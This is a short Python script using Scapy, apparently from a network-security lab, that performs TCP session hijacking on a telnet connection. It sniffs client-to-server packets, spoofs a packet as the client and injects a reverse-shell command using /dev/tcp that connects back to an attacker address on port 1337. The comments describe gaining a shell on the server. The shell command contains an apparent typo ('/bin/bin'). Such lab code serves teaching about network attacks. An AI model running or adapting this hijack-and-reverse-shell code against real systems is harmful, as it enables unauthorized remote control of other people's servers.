#!/usr/bin/env python3

from scapy.all import *

def sess_hijack(pkt):
    if pkt.haslayer(TCP):

        data = "/bin/bin -i > /dev/tcp/10.2.5.1/1337 0<&1 2>&1\n"

        newseq = pkt[TCP].seq #+ 10
        newack = pkt[TCP].ack #+ 1

        ip = IP(src="10.2.5.2", dst="10.2.5.3")         # spoof packet as client to trick server

        tcp = TCP(sport=pkt[TCP].sport, dport=23, flags="A", seq=newseq, ack=newack)
    
        pkt = ip/tcp/data
        send(pkt, verbose=0)        # server receives reverse shell cmd from the forged client message
        quit()                      # we now have a reverse shell of the server machine in attackers terminal

if __name__ == "__main__":
    print("Starting session hijacking...")
    
    iface = 'br-73b95a5ac7de'
    
    applied_filter = "tcp and src host 10.2.5.2 " \
                     "and dst host 10.2.5.3 " \
                     "and dst port 23"

    sniff(iface=iface, filter=applied_filter, prn=sess_hijack)
